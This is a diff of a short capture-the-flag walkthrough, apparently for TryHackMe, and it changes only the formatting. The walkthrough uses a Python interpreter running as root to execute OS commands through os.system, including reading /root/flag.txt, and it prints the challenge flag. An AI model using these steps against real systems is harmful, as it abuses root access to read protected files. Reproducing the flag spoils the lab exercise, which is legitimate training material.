@@ -25,6 +25,7 @@ we only need to init one library for OS commands
 now, lets see if we are root. (euid = 0:root)
 
 > geteuid()
+
 '''
 0
 '''
@@ -33,6 +34,7 @@ Grate! python user has root privileges! lets use that ofc...
 the syntax should look like this 
 
 > os.system("whoami")
+
 '''
 root
 0
@@ -43,6 +45,7 @@ note you can press the arrow-key-up button to toggle previous commands exactly l
 to get the flag we will do the following
 
 > os.system("cat /root/flag.txt")
+
 '''
 THM{3asy_f14g_1m40}
 '''
@@ -52,8 +55,10 @@ THM{3asy_f14g_1m40}
 
 do you want to make your life easyer? (that's what python ment for)
  
->>> def A(i):
-...     os.system(i)
+> def A(i):
+
+>	os.system(i)
+
 press return key (enter)
 
 
